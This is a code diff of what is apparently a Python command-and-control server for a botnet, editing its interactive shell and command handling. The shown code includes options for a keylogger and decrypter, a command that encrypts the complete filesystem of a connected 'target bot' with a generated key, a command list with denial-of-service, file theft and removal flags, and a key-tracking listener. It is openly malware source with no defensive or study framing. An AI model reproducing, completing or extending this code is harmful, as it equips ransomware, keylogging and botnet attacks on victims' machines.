@@ -7,6 +7,7 @@ import os
 import socket
 import threading
 import time
+import keyboard
 
 from cmd import Cmd
 from cryptography.fernet import Fernet
@@ -51,13 +52,14 @@ class botOptions:
     keylogger = '666'
     decrypter = '989'
 
+'''
 class ShellCommands(Cmd):
-    def do_exit(self, inp):
+    def do_exit(self):
         print_log('[--] interactive mode')
         return True
     
-    def do_encryp(self):
-        '''encrypts the complete filesystem of the connected target bot'''
+    def do_encrypt(self):
+        # encrypts the complete filesystem of the connected target bot
         client_sock.send(botOptions.encrypter.encode())
         key = Fernet.generate_key()
         key = key.decode()
@@ -88,7 +90,7 @@ class ShellCommands(Cmd):
                 break
             else:
                 print_log(f'[WW] recieved status : {answ}')     
-
+''' 
 class CCServer:
     def __init__(self, addr, port):
         
@@ -119,17 +121,16 @@ class CCServer:
             client_thread.start()   
         
     def interactive_mode(self, client_sock, client_addr):
-        self.help_menu()
-              
+        self.help_menu()    
         cmd = ''
-        try:
-            ShellCommands(client_sock, client_addr).cmdloop()
+        #try:
+            #ShellCommands(client_sock, client_addr).cmdloop()
             #cmd = input()
-        except:
+        #except:
             #cmd = input('cmd:> ')
-            print("didnt work")
-            cmdArray = ["-s","-encr","-decr","-ls","-uf","-ud","-d","-dos","-p","-rm","-k", "-b"]
+            #print("didnt work")
         try:
+            cmdArray = ["-s","-encr","-decr","-ls","-uf","-ud","-d","-dos","-p","-rm","-k", "-b"]
             for i in range(len(cmdArray)):
                 if cmdArray[i] in cmd:
                     if cmdArray[i] == "-s":
@@ -304,9 +305,7 @@ class CCServer:
                                 with open (path, 'w') as f:
                                     f.write(response)
                                 f.close()
-                                print_log(f'[**] fs written to {path}')                            
-                            
-                        
+                                print_log(f'[**] fs written to {path}')                                                
             else:
                 #print_log('[--] interactive mode. no command specified.')
                 pass
@@ -331,8 +330,7 @@ class CCServer:
             self.encr = False
         print_log(pynputOK)
         print_log(cryptographyOK)
-        self.key_tracking(client_socket, client_addr)
-        
+        self.key_tracking(client_socket, client_addr)     
         
     def listen_key(self, client_sock, client_addr):
         while True:
@@ -421,7 +419,6 @@ def main():
     newCC = CCServer(serveraddr, int(serverport))
     newCC.run()
    
- 
 try:
     main()
 except KeyboardInterrupt:
